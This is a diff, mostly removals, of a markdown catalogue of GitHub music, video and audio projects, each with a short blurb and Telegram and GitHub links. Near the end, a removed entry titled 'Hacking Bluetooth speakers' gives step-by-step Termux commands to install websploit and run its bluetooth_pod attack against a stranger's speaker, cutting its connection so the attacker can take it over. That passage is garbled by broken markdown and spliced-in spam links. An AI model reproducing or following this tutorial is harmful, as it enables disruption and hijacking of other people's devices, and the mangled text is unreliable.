-- 🐙 **Source Code:** [https://github.com/lettier/gifcurry](https://github.com/lettier/gifcurry)
-- 👤 **Developer:** [lettier](https://github.com/lettier)
-
-
----
-
-### 📦 Neteasecloudmusicapi
-
-> **Categories:** `#Interesting` `#Web` `#Useful`
-
-Supports npx, automatically installs dependencies and runs them
-
-⤷[Project link](https://github.com/Binaryify/NeteaseCloudMusicApi)
-
-[GitHub](https://t.me/github_society) | #Interesting #Web #Useful
-
-- 🐙 **Source Code:** [https://github.com/Binaryify/NeteaseCloudMusicApi](https://github.com/Binaryify/NeteaseCloudMusicApi)
-- 👤 **Developer:** [Binaryify](https://github.com/Binaryify)
-
-
----
-
-### 📦 Auxio
-
-> **Categories:** `#Interesting` `#Android` `#Audio` `#Player`
-
-The trick is that it doesn't have most of the useless features found in other music players.
-
-⤷ [Project link](https://github.com/oxygencobalt/Auxio)
-
-[GitHub](https://t.me/github_society) | #Interesting #Android #Audio #Player
-
-- 🐙 **Source Code:** [https://github.com/oxygencobalt/Auxio](https://github.com/oxygencobalt/Auxio)
-- 👤 **Developer:** [oxygencobalt](https://github.com/oxygencobalt)
-
-<details>
-<summary><b>🖼️ Preview Screenshots & Media (1)</b> — <i>Click to view images & decide if you want to use this app</i></summary>
-
-#### 📸 Cover / Preview
-<p align="center"><img src="../../assets/apps/auxio/cover.jpg" alt="Cover / Preview" style="max-height: 480px; max-width: 100%; border-radius: 8px; margin: 8px auto;" /></p>
-
-</details>
-
-
----
-
-### 📦 Vhs
-
-> **Categories:** `#Interesting` `#Terminal` `#Video`
-
-Possibility of fine-tuning to suit your preferences
-
-⤷ [Project link](https://github.com/charmbracelet/vhs)
-
-[GitHub](https://t.me/github_society) | #Interesting #Terminal #Video
-
-- 🐙 **Source Code:** [https://github.com/charmbracelet/vhs](https://github.com/charmbracelet/vhs)
-- 👤 **Developer:** [charmbracelet](https://github.com/charmbracelet)
-
-
----
-
-### 📦 Youtube Chapters In Player
-
-> **Categories:** `#Interesting` `#Extension` `#Useful`
-
-Works in full screen and “theater” modes
-
-⤷ [Project link](https://github.com/ris58h/youtube-chapters-in-player)
-
-[GitHub](https://t.me/github_society) | #Interesting #Extension #Useful
-
-- 🐙 **Source Code:** [https://github.com/ris58h/youtube-chapters-in-player](https://github.com/ris58h/youtube-chapters-in-player)
-- 👤 **Developer:** [ris58h](https://github.com/ris58h)
-
-
----
-
-### 📦 Untrunc
-
-> **Categories:** `#Interesting` `#Video` `#Useful`
-
-Uses a file shot on the same camera as a reference for restoration
-
-⤷ [Project link](https://github.com/anthwlock/untrunc)
-
-[GitHub](https://t.me/github_society) | #Interesting #Video #Useful
-
-- 🐙 **Source Code:** [https://github.com/anthwlock/untrunc](https://github.com/anthwlock/untrunc)
-- 👤 **Developer:** [anthwlock](https://github.com/anthwlock)
-
-
----
-
-### 📦 Auto Synced Translated Dubs
-
-> **Categories:** `#Interesting` `#Video` `#Audio`
-
-⤷ [Project Link](https://github.com/ThioJoe/Auto-Synced-Translated-Dubs)
-⤷ [Example](https://youtu.be/uaHmtJrZRdM)
-
-[GitHub](https://t.me/github_society) | #Interesting #Video #Audio
-
-- 🐙 **Source Code:** [https://github.com/ThioJoe/Auto-Synced-Translated-Dubs](https://github.com/ThioJoe/Auto-Synced-Translated-Dubs)
-- 👤 **Developer:** [ThioJoe](https://github.com/ThioJoe)
-
-
----
-
-### 📦 Remsi
-
-> **Categories:** `#Python` `#Video` `#Interesting`
-
-⤷ [Project link](https://github.com/bambax/Remsi)
-
-[GitHub](https://t.me/github_community) | #Python #Video #Interesting
-
-- 🐙 **Source Code:** [https://github.com/bambax/Remsi](https://github.com/bambax/Remsi)
-- 👤 **Developer:** [bambax](https://github.com/bambax)
-
-
----
-
-### 📦 Musort
-
-> **Categories:** `#Interesting` `#Useful` `#Music`
-
-Allows you to more easily organize your music library
-
-⤷ [Project link](https://github.com/tdeerenberg/Musort)
-
-[GitHub](https://t.me/github_society) | #Interesting #Useful #Music
-
-- 🐙 **Source Code:** [https://github.com/tdeerenberg/Musort](https://github.com/tdeerenberg/Musort)
-- 👤 **Developer:** [tdeerenberg](https://github.com/tdeerenberg)
-
-
----
-
-### 📦 Vidgear
-
-> **Categories:** `#Interesting` `#Python` `#Useful` `#Video`
-
-⤷ [Ссылка на проект](https://github.com/abhiTronix/vidgear)
-
-[GitHub](https://t.me/github_society) | #Interesting #Python #Useful #Video
-
-- 🐙 **Source Code:** [https://github.com/abhiTronix/vidgear](https://github.com/abhiTronix/vidgear)
-- 👤 **Developer:** [abhiTronix](https://github.com/abhiTronix)
-
-
----
-
-### 📦 Pyaudioanalysis
-
-> **Categories:** `#Python` `#Audio` `#Analyzer` `#Interesting`
-
-With pyAudioAnalysis you can classify unknown sounds, recognize sounds using machine learning and much more
-
-⤷ [Project link](https://github.com/tyiannak/pyAudioAnalysis)
-
-[GitHub](https://t.me/github_society) | #Python #Audio #Analyzer #Interesting
-
-- 🐙 **Source Code:** [https://github.com/tyiannak/pyAudioAnalysis](https://github.com/tyiannak/pyAudioAnalysis)
-- 👤 **Developer:** [tyiannak](https://github.com/tyiannak)
-
-
----
-
-### 📦 Pitivi
-
-> **Categories:** `#Interesting` `#Video` `#Editor` `#Useful`
-
-Pitivi has support for an unlimited number of layers, saving a complete history of operations with the ability to rollback, displaying thumbnails on the timeline, support for typical video and audio processing operations
-
-⤷ [Project link](https://github.com/pitivi/pitivi)
-
-[GitHub](https://t.me/github_society) | #Interesting #Video #Editor #Useful
-
-- 🐙 **Source Code:** [https://github.com/pitivi/pitivi](https://github.com/pitivi/pitivi)
-- 👤 **Developer:** [pitivi](https://github.com/pitivi)
-
-
----
-
-### 📦 Send To Vlc
-
-> **Categories:** `#JavaScript` `#Browser` `#Interesting`
-
-Supports:
-• MPV player (Chrome, Firefox)
-• MPlayer (Chrome, Firefox, Opera)
-• MPC (Chrome, Firefox, Opera)
-• VLC VideoLan (Chrome, Firefox, Opera)
-
-⤷ [Project link](https://github.com/belaviyo/send-to-vlc)
-
-[GitHub](https://t.me/github_society) | #JavaScript #Browser #Interesting
-
-- 🐙 **Source Code:** [https://github.com/belaviyo/send-to-vlc](https://github.com/belaviyo/send-to-vlc)
-- 👤 **Developer:** [belaviyo](https://github.com/belaviyo)
-
-
----
-
-### 📦 Ambient
-
-> **Categories:** `#Interesting` `#Game` `#3D`
-
-The engine provides a runtime for creating multiplayer games and 3D applications that compile to a WebAssembly representation and use the WebGPU API for rendering
-
-⤷ [Project link](https://github.com/AmbientRun/Ambient)
-
-[GitHub](https://t.me/github_society) | #Interesting #Game #3D
-
-- 🐙 **Source Code:** [https://github.com/AmbientRun/Ambient](https://github.com/AmbientRun/Ambient)
-- 👤 **Developer:** [AmbientRun](https://github.com/AmbientRun)
-
-
----
-
-### 📦 Webcam Filters
-
-> **Categories:** `#Linux` `#Video` `#Interesting`
-
-The app creates a virtual webcam with a common set of filters that you can use in other video conferencing apps
-
-⤷ [Project link](https://github.com/jashandeep-sohi/webcam-filters)
-
-[GitHub](https://t.me/github_community) | #Linux #Video #Interesting
-
-- 🐙 **Source Code:** [https://github.com/jashandeep-sohi/webcam-filters](https://github.com/jashandeep-sohi/webcam-filters)
-- 👤 **Developer:** [jashandeep-sohi](https://github.com/jashandeep-sohi)
-
-
----
-
-### 📦 Coltrane
-
-> **Categories:** `#Ruby` `#Music` `#Interesting`
-
-To work with this library, a CLI interface is used
-
-Theory is demonstrated with examples for guitar, bass, piano or ukelele
-
-⤷ [Project link](https://github.com/pedrozath/coltrane)
-
-[GitHub](https://t.me/github_society) | #Ruby #Music #Interesting
-
-- 🐙 **Source Code:** [https://github.com/pedrozath/coltrane](https://github.com/pedrozath/coltrane)
-- 👤 **Developer:** [pedrozath](https://github.com/pedrozath)
-
-
----
-
-### 📦 Text2Youtube
-
-> **Categories:** `#Interesting` `#Youtube`
-
-**
-Based on a text prompt, the AI generates a script, queries Youtube/Storyblocks for clips, generates a voice using Bark, and stitches everything together with MoviePY
-
-⤷ [Project link](https://github.com/artkulak/text2youtube)
-
-[GitHub](https://t.me/github_society) | #Interesting #Youtube
-
-- 🐙 **Source Code:** [https://github.com/artkulak/text2youtube](https://github.com/artkulak/text2youtube)
-- 👤 **Developer:** [artkulak](https://github.com/artkulak)
-
-
----
-
-### 📦 Daktilo
-
-> **Categories:** `#Interesting` `#Useful` `#GitHub` `#OpenSource`
-
-It offers various presets such as classic typewriter effect, music box random notes and quack
-
-⤷ [Project link](https://github.com/orhun/daktilo)
-
-[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Interesting #Useful
-
-- 🐙 **Source Code:** [https://github.com/orhun/daktilo](https://github.com/orhun/daktilo)
-- 👤 **Developer:** [orhun](https://github.com/orhun)
-
-
----
-
-### 📦 Speech Condenser
-
-> **Categories:** `#Interesting` `#Video`
-
-The process includes audio extraction, speaker diarization, audio separation, speech-to-text transcription, and AI summarization.
-
-⤷ [Project link](https://github.com/nezhar/speech-condenser)
-
-[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Interesting #Video
-
-- 🐙 **Source Code:** [https://github.com/nezhar/speech-condenser](https://github.com/nezhar/speech-condenser)
-- 👤 **Developer:** [nezhar](https://github.com/nezhar)
-
-
----
-
-### 📦 Youtube Channel Archiver
-
-> **Categories:** `#Interesting` `#Video` `#GitHub` `#OpenSource`
-
-**Automates downloads of videos, previews and comments from the target channel (or channels).**
-
-⤷ **[**Link to project**](https://github.com/dmn001/youtube_channel_archiver)
-
-[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Interesting #Video
-
-- 🐙 **Source Code:** [https://github.com/dmn001/youtube_channel_archiver](https://github.com/dmn001/youtube_channel_archiver)
-- 👤 **Developer:** [dmn001](https://github.com/dmn001)
-
-
----
-
-### 📦 Navidrome
-
-> **Categories:** `#Interesting` `#Music` `#Manager` `#Useful` `#GitHub` `#OpenSource`
-
-**
-It lets you enjoy your music collection from anywhere, making it accessible through a modern web interface and a range of mobile apps available for both iOS and Android devices.
-
-**⤷ **[**Link to project**](https://github.com/navidrome/navidrome)
-
-[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Interesting #Music #Manager #Useful
-
-- 🐙 **Source Code:** [https://github.com/navidrome/navidrome](https://github.com/navidrome/navidrome)
-- 👤 **Developer:** [navidrome](https://github.com/navidrome)
-
-
----
-
-### 📦 Whisper Clip
-
-> **Categories:** `#Interesting` `#Tool` `#Audio` `#AI` `#GitHub` `#OpenSource`
-
-It uses OpenAI's Whisper and includes recording, transcribing audio, and saving the transcription to the clipboard.
-
-**⤷ **[**Link to project**](https://github.com/gustavostz/whisper-clip)
-
-[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Interesting #Tool #Audio #AI
-
-- 🐙 **Source Code:** [https://github.com/gustavostz/whisper-clip](https://github.com/gustavostz/whisper-clip)
-- 👤 **Developer:** [gustavostz](https://github.com/gustavostz)
-
-
----
-
-### 📦 Cmdf
-
-> **Categories:** `#Youtube` `#Useful` `#GitHub` `#OpenSource`
-
-Uses features of whisper.cpp. To process the video, use the F9 hotkey, after pressing which the background decryption of the video will begin. Once the video is processed, press Cmd + F, enter your query and press F10.
-
-**⤷ **[**Link to project**](https://github.com/dotvignesh/CmdF)
-
-[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Youtube #Useful
-
-- 🐙 **Source Code:** [https://github.com/dotvignesh/CmdF](https://github.com/dotvignesh/CmdF)
-- 👤 **Developer:** [dotvignesh](https://github.com/dotvignesh)
-
-
----
-
-### 📦 Cryptoframe
-
-> **Categories:** `#Security` `#Interesting` `#Video`
-
-It allows users to embed hidden text messages in video files. Uses seven levels of AES-256 encryption in CBC mode, protected by RSA encryption. Supports almost all input video formats.
-
-**⤷ **[**Link to project**](https://github.com/x011/CryptoFrame)**
-**
-🐱 [GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Security #Interesting #Video
-
-- 🐙 **Source Code:** [https://github.com/x011/CryptoFrame](https://github.com/x011/CryptoFrame)
-- 👤 **Developer:** [x011](https://github.com/x011)
-
-
----
-
-### 📦 Bash Video
-
-> **Categories:** `#Bash` `#Video` `#Useful`
-
-The script facilitates operations such as cutting, splicing, changing playback speed, optimizing video size, trimming, extracting audio, adding audio, resizing, rotating, recording screen, adding subtitles, applying video filters and much more.
-
-⤷** **[**Link to project**](https://github.com/allen-munsch/bash-video)
-
-📢[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Bash #Video #Useful
-
-- 🐙 **Source Code:** [https://github.com/allen-munsch/bash-video](https://github.com/allen-munsch/bash-video)
-- 👤 **Developer:** [allen-munsch](https://github.com/allen-munsch)
-
-
----
-
-### 📦 Multi Modal Starter Kit
-
-> **Categories:** `#AI` `#Interesting` `#Video`
-
-Takes just a few frames as a basis. Works with models such as LLaVa, LLaVa-vicuna, BakLLaVA, GPT-4v.
-
-**⤷ **[**Link to project**](https://github.com/tigrisdata-community/multi-modal-starter-kit)
-
-📢[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #AI #Interesting #Video
-
-- 🐙 **Source Code:** [https://github.com/tigrisdata-community/multi-modal-starter-kit](https://github.com/tigrisdata-community/multi-modal-starter-kit)
-- 👤 **Developer:** [tigrisdata-community](https://github.com/tigrisdata-community)
-
-
----
-
-### 📦 Detonator
-
-> **Categories:** `#2D` `#Useful` `#Linux` `#OpenGL`
-
-Designed for simple single-player games such as puzzles, platformers and tile-based real-time strategy games.
-
-**⤷ **[**Link to project**](https://github.com/ensisoft/detonator)
-
-📢[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #2D #Useful #Linux #OpenGL
-
-- 🐙 **Source Code:** [https://github.com/ensisoft/detonator](https://github.com/ensisoft/detonator)
-- 👤 **Developer:** [ensisoft](https://github.com/ensisoft)
-
-
----
-
-### 📦 Skip Yt Ad
-
-> **Categories:** `#Useful` `#Youtube`
-
-Features include skipping multiple ads, running smoothly in the background, light and easy to use, and skipping YT surveys. The extension skips ads in less than 100 milliseconds.
-
-⤷** **[**Link to project**](https://github.com/dikshantrajput/skip-yt-ad)
-
-😸[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Useful #Youtube
-
-- 🐙 **Source Code:** [https://github.com/dikshantrajput/skip-yt-ad](https://github.com/dikshantrajput/skip-yt-ad)
-- 👤 **Developer:** [dikshantrajput](https://github.com/dikshantrajput)
-
-
----
-
-### 📦 Btfs
-
-> **Categories:** `#Bit` `#Useful`
-
-Tools such as ls, cat and cp work as expected. Applications like vlc and mplayer can also run without modification.
-
-**⤷ **[**Link to project**](https://github.com/johang/btfs)
-
-📢[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Bit #Useful
-
-- 🐙 **Source Code:** [https://github.com/johang/btfs](https://github.com/johang/btfs)
-- 👤 **Developer:** [johang](https://github.com/johang)
-
-
----
-
-### 📦 Pyzam
-
-> **Categories:** `#Audio` `#Shazam` `#Useful` `#GitHub` `#OpenSource`
-
-Uses the Shazam API, so known limitations include a call limit of 20 requests per minute and a sampling limit of 12 seconds per request.
-**
-⤷ **[**Link to project**](https://github.com/lukafilipxvic/Pyzam)
-
-📢[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Audio #Shazam #Useful
-
-- 🐙 **Source Code:** [https://github.com/lukafilipxvic/Pyzam](https://github.com/lukafilipxvic/Pyzam)
-- 👤 **Developer:** [lukafilipxvic](https://github.com/lukafilipxvic)
-
-
----
-
-### 📦 Ardour
-
-> **Categories:** `#Audio` `#Useful`
-
-**
-offers tools for cutting, moving, stretching, copying, pasting and deleting. It has a flexible mixer architecture and hundreds of plugins. Offers powerful signal routing capabilities.
-
-**⤷ **[**Link to project**](https://github.com/Ardour/ardour)
-
-📢[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Audio #Useful
-
-- 🐙 **Source Code:** [https://github.com/Ardour/ardour](https://github.com/Ardour/ardour)
-- 👤 **Developer:** [Ardour](https://github.com/Ardour)
-
-
----
-
-### 📦 Audiojs
-
-> **Categories:** `#Audio` `#Flash` `#HTML`
-
-It is possible to customize the appearance of the player.
-
-If the browser does not support the audio tag, Flash capabilities will be used.
-
-⤷ [**Link to project**](https://github.com/kolber/audiojs)
-
-📢[GitHub](https://t.me/+rB2DxiwI4X5iYjcy) | #Audio #Flash #HTML
-
-- 🐙 **Source Code:** [https://github.com/kolber/audiojs](https://github.com/kolber/audiojs)
-- 👤 **Developer:** [kolber](https://github.com/kolber)
-
-
----
-
-### 📦 Papermusic
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-To run Papermusic, users need to place a hand-drawn musical instrument in front of a webcam, with the notes clearly written on it.
-
-**4️⃣**** **[**GitHub**](https://t.me/+rB2DxiwI4X5iYjcy)
-
-- 🐙 **Source Code:** [https://github.com/askmeegs/papermusic](https://github.com/askmeegs/papermusic)
-- 👤 **Developer:** [askmeegs](https://github.com/askmeegs)
-
-
----
-
-### 📦 Lineupx
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-This is a set of instructions that the player follows to throw a grenade. They are used in many FPS games such as Counter-Strike, Valorant and Overwatch.
-
-**4️⃣**** **[**GitHub**](https://t.me/github_tg)
-
-- 🐙 **Source Code:** [https://github.com/shimupan/lineupx](https://github.com/shimupan/lineupx)
-- 👤 **Developer:** [shimupan](https://github.com/shimupan)
-
-
----
-
-### 📦 Yandex Music Downloader
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-**4️⃣**** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
-
-- 🐙 **Source Code:** [https://github.com/llistochek/yandex-music-downloader](https://github.com/llistochek/yandex-music-downloader)
-- 👤 **Developer:** [llistochek](https://github.com/llistochek)
-
-
----
-
-### 📦 Circuitsax
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-It allows you to play any software instrument using the fingering of a saxophone, allowing you to practice without disturbing others, create music in any DAW, and even perform with it.
-
-✳️** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
-
-- 🐙 **Source Code:** [https://github.com/Whackalenso/CircuitSax](https://github.com/Whackalenso/CircuitSax)
-- 👤 **Developer:** [Whackalenso](https://github.com/Whackalenso)
-
-
----
-
-### 📦 Fast Music Remover
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-✳️** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
-
-- 🐙 **Source Code:** [https://github.com/omeryusufyagci/fast-music-remover](https://github.com/omeryusufyagci/fast-music-remover)
-- 👤 **Developer:** [omeryusufyagci](https://github.com/omeryusufyagci)
-
-
----
-
-### 📦 Web Player
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-5️⃣** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
-
-- 🐙 **Source Code:** [https://github.com/DataSC3/web-player](https://github.com/DataSC3/web-player)
-- 👤 **Developer:** [DataSC3](https://github.com/DataSC3)
-
-
----
-
-### 📦 Musializer
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-The goal of the project is to create a tool for creating beautiful music visualizations and their high-quality video downloads.
-
-♎️** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
-
-- 🐙 **Source Code:** [https://github.com/tsoding/musializer](https://github.com/tsoding/musializer)
-- 👤 **Developer:** [tsoding](https://github.com/tsoding)
-
-
----
-
-### 📦 Ableton Mcp
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-This integration allows you to create music with prompts, create tracks, and manage Live sessions.
-
-♎️** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
-
-- 🐙 **Source Code:** [https://github.com/ahujasid/ableton-mcp](https://github.com/ahujasid/ableton-mcp)
-- 👤 **Developer:** [ahujasid](https://github.com/ahujasid)
-
-
----
-
-### 📦 Seedbox Lite
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-— Automatically downloads movies from torrents;
-— Works on any gadget with a browser: from phone to PC;
-- No waiting - instant playback;
-— Built-in media player with subtitles, gestures and full-screen mode;
-— Installation takes a couple of minutes, there are detailed instructions.
-
-[Install](https://github.com/hotheadhacker/seedbox-lite) and stock up on popcorn.
-
-🌒 [**1337**](https://t.me/+TnMtlhTPGQ9mZmIy)
-
-- 🐙 **Source Code:** [https://github.com/hotheadhacker/seedbox-lite](https://github.com/hotheadhacker/seedbox-lite)
-- 👤 **Developer:** [hotheadhacker](https://github.com/hotheadhacker)
-
-
----
-
-### 📦 Pinstr
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-With Pinstr, you can easily organize your interests and find new ideas, inspiration, and recommendations. Whether you like movies, music, food, Bitcoin, Nostr or anything else, Pinstr has you covered.
-
-Additionally, you can interact with other users by liking, commenting, and liking their boards.
-
-🐱** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
-
-- 🐙 **Source Code:** [https://github.com/sepehr-safari/pinstr](https://github.com/sepehr-safari/pinstr)
-- 👤 **Developer:** [sepehr-safari](https://github.com/sepehr-safari)
-
-
----
-
-### 📦 Openspot Music App
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-Created using modern technology, it has a beautiful responsive interface that looks great on any device.
-
-🐱** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
-
-- 🐙 **Source Code:** [https://github.com/BlackHatDevX/openspot-music-app](https://github.com/BlackHatDevX/openspot-music-app)
-- 👤 **Developer:** [BlackHatDevX](https://github.com/BlackHatDevX)
-
-
----
-
-### 📦 Photon** - instant file upload tool
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-The program allows you to download almost any files from the Internet: documents, PDF, texts, music, videos, images and even GIF animations.
-
-**Features:**
-▫️Simultaneous upload of up to 10 files;
-▫️Easy installation;
-▫️Works locally only on your computer.
-
-We use it for free - [here](https://github.com/zmzhang8/Photon)
-
-🐱** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
-
-- 🐙 **Source Code:** [https://github.com/zmzhang8/Photon](https://github.com/zmzhang8/Photon)
-- 👤 **Developer:** [zmzhang8](https://github.com/zmzhang8)
-
-
----
-
-### 📦 Petrichor
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-**Features:**
-▫️Everything you expect from a standalone music player!
-▫️Supports MP3, M4A, WAV, AAC, AIFF and FLAC file formats.
-▫️Map music folders and view your music library in an organized manner.
-▫️Create playlists and manage your play queue interactively.
-▫️If necessary, view music in the form of folders.
-▫️Pin anything (almost anything!) to the sidebar for quick access to your favorite music.
-▫️Easy navigation: right-click on a track to go to its album, artist, year, etc.
-
-🐱** **[**G**](https://t.me/economy_news)[**itHu**](https://t.me/+3xphzXTayGE1NDVi)[**b**](https://t.me/bloomeconomy)
-
-- 🐙 **Source Code:** [https://github.com/kushalpandya/Petrichor](https://github.com/kushalpandya/Petrichor)
-- 👤 **Developer:** [kushalpandya](https://github.com/kushalpandya)
-
-
----
-
-### 📦 Handbrake
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-HandBrake takes the videos you already have and creates new ones from them that you can play on your mobile phone, tablet, media player, game console, computer or web browser - virtually any device that supports modern video formats.
-
-🐱** **[**GitHub**](https://t.me/github)
-
-- 🐙 **Source Code:** [https://github.com/HandBrake/HandBrake](https://github.com/HandBrake/HandBrake)
-- 👤 **Developer:** [HandBrake](https://github.com/HandBrake)
-
-
----
-
-### 📦 Bettermodel
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-It implements fully server-side 3D models using a package of item display entities.
-
-— Import Generic BlockBench .bbmodel model
-— Auto-generation of a resource package
-— Play animation
-— Synchronization with the base entity
-- Custom hit block
-— Player animation with 12 limbs
-
-🐱** **[**GitHub**](https://t.me/github)
-
-- 🐙 **Source Code:** [https://github.com/toxicity188/BetterModel](https://github.com/toxicity188/BetterModel)
-- 👤 **Developer:** [toxicity188](https://github.com/toxicity188)
-
-
----
-
-### 📦 Chibi
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-One bot - dozens of models: GPT, Claude, Gemini, DeepSeek, Grok, Qwen, Kimi, MiniMax, ZhipuAI and others. He decides which provider to use for the task. Writes and reviews code, runs tests, does research, generates pictures and music.
-
-Can spawn sub-agents and work in parallel with you in the background. Extensible via MCP: GitHub, browser, databases, Docker. Self-hosted - your own keys, your own server, no vendor lock-in.
-
-🐱** **[**GitHub**](https://t.me/github)
-
-- 🐙 **Source Code:** [https://github.com/s-nagaev/chibi](https://github.com/s-nagaev/chibi)
-- 👤 **Developer:** [s-nagaev](https://github.com/s-nagaev)
-
-
----
-
-### 📦 Museeks
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-It doesn't have a ton of features because its purpose is not to compete with more feature-rich and popular music players.
-
-🐱** **[**GitHub**](https://t.me/github)
-
-- 🐙 **Source Code:** [https://github.com/martpie/museeks](https://github.com/martpie/museeks)
-- 👤 **Developer:** [martpie](https://github.com/martpie)
-
-
----
-
-### 📦 Skyrift Server
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-Inside there are already basic online RPG systems: authorization, characters, classes, inventory, equipment, skills, effects, quests, NPCs, mobs, chat, movement, combat, teleports and world simulation.
-
-The project is divided into a persistent part and a realtime layer: the server does not just store data, but maintains the active state of the world, game sessions and processing player actions in real time.
-
-🐱** **[**GitHub**](https://t.me/github)
-
-- 🐙 **Source Code:** [https://github.com/Leroyalle/skyrift-server](https://github.com/Leroyalle/skyrift-server)
-- 👤 **Developer:** [Leroyalle](https://github.com/Leroyalle)
-
-
----
-
-### 📦 Fable Player
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-🐱** **[**GitHub**](https://t.me/github)
-
-- 🐙 **Source Code:** [https://github.com/GuardionSpend/fable-player](https://github.com/GuardionSpend/fable-player)
-- 👤 **Developer:** [GuardionSpend](https://github.com/GuardionSpend)
-
-
----
-
-### 📦 Radioplayerv3
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-🐱** **[**GitHub**](https://t.me/github)
-
-- 🐙 **Source Code:** [https://github.com/AsmSafone/RadioPlayerV3](https://github.com/AsmSafone/RadioPlayerV3)
-- 👤 **Developer:** [AsmSafone](https://github.com/AsmSafone)
-
-
----
-
-### 📦 Bassbust straight to the body
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-An engineer under the nickname SweetestAura has released the osu-buttplug utility, which synchronizes beats and rhythm from Osu! with smart toys via Buttplug.io.
-
-The program reads the card timings via the API and translates every click, slider and clamp to the music into real vibration. Literally allows you to feel the bass and rhythm of the track 100%.
-
-Pull requests are welcome, but you will have to [test](https://github.com/atorixa/osu-lovense) the code at your own risk.
-​
-🐱** **[**GitHub**](https://t.me/github)
-
-- 🐙 **Source Code:** [https://github.com/atorixa/osu-lovense](https://github.com/atorixa/osu-lovense)
-- 👤 **Developer:** [atorixa](https://github.com/atorixa)
-
-
----
-
-### 📦 Audiomonitorrouter
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-As soon as you move the browser window, video player or game to another screen, AudioMonitorRouter instantly redirects the sound of this program to the speakers of the exact monitor where its window is located! Windows 10.11 platform
-
-🐱** **[**GitHub**](https://t.me/github)
-
-- 🐙 **Source Code:** [https://github.com/kitbee/AudioMonitorRouter](https://github.com/kitbee/AudioMonitorRouter)
-- 👤 **Developer:** [kitbee](https://github.com/kitbee)
-
-
----
-
-### 📦 Hacking Bluetooth speakers
-
-> **Categories:** `#GitHub` `#OpenSource`
-
-Sa**lute, bandits! I think many schoolchildren with speakers playing terrible music are enraged. And I think everyone would like to drown out this nightmare. In this post, you will learn how to break the Bluetooth connection between the speaker and the phone, and even connect to** it and turn** `on your mus`**i**c`.
-
-Installation
-
-$ `**p**k`g update
-$ pkg i`**n**s`tall python
-$ pkg in`**s**t`all git
-$ pkg insta`**l**l` python2
-$ pip2 install scapy
-$ git clone https://git`**h**u`b.com/The404H`**a**c`king/websploit
-$ cd webspl`**oit
-$ chm**o`d 777 * websploit.py
-
-`launch
-
-$ python2 websploit.py
-
-We open the utility**.** `Next, we write the following:`
-
-$ use bluetooth/bluetooth_pod
-
-Then follow the link a[nd ](https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp&hl=ru&gl=US)download "nRF Connect" - [LINK](https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp&hl=ru&gl=US) Install and open, after which we give the necessary permissions. Click "SCAN", look for the column, and copy its mac-address.
-
-We return to T**e**r`mux and write`** **t`he following:
-
-$ set `**s**i`ze 99`9
-$ set bdaddr mac address
-$ run
-
-Instead of "mac-ad[d](https://t.me/Oblako_sxem)ress" paste the copied mac-address. Further, as soon as the speaker stops playing sound, this means that we have broken the connection, so we immediately try to connect [via](https://t.me/Oblako_sxem) "nRF Connect" to the speaker.
-
-It is also worth clarifying that if the distance to the co[l](https://t.me/Oblako_sxem)umn is too large, then nothing will come of it. In this way, you can break the connection not only of the bluetoot[h s](https://t.me/Oblako_sxem)peaker, but also of any other devices with a "blue tooth".
-
-For more power, I advise you to create as many as 8 sessions and launch an attack in all ✌️‌‌
-
-- 🌐 **Official Website:** [https://git`**h**u`b.com/The404H`**a**c`king/websploit](https://git`**h**u`b.com/The404H`**a**c`king/websploit)
+- 🐙 **Source Code:** [https://github.com/steve228uk/YouTube-Music](https://github.com/steve228uk/YouTube-Music)
+- 👤 **Developer:** [steve228uk](https://github.com/steve228uk)
 
 
 ---
